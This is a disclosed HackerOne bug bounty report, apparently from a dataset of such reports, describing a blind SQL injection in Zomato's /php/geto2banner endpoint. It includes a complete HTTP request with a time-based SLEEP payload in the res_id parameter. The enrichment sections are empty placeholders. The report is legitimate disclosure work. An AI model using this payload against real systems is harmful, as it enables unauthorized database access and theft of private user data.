---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '838855'
original_report_id: '838855'
title: '[www.zomato.com] Blind SQL Injection in /php/geto2banner'
weakness: SQL Injection
team_handle: zomato
created_at: '2020-04-04T14:15:36.412Z'
disclosed_at: '2020-08-10T13:27:02.782Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 60
asset_identifier: '*.zomato.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- sql-injection
---

# [www.zomato.com] Blind SQL Injection in /php/geto2banner

## Metadata

- HackerOne Report ID: 838855
- Weakness: SQL Injection
- Program: zomato
- Disclosed At: 2020-08-10T13:27:02.782Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Hi Team!

Our team discovered a ``Blind SQL Injection`` by Abusing LocalParams (`res_id`) in `/php/geto2banner`
**We are working to create a full PDF Report as an WriteUp ;)**

## Here is a Temporal Exploit based on the Vulnerable request:

```
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Connection: close
Content-Length: 73
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

Thank you so much!!

- As you can see in the request - we are able to **Exploit** it to **extract data from your DB**!

## Impact

## Full database access holding private user information.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
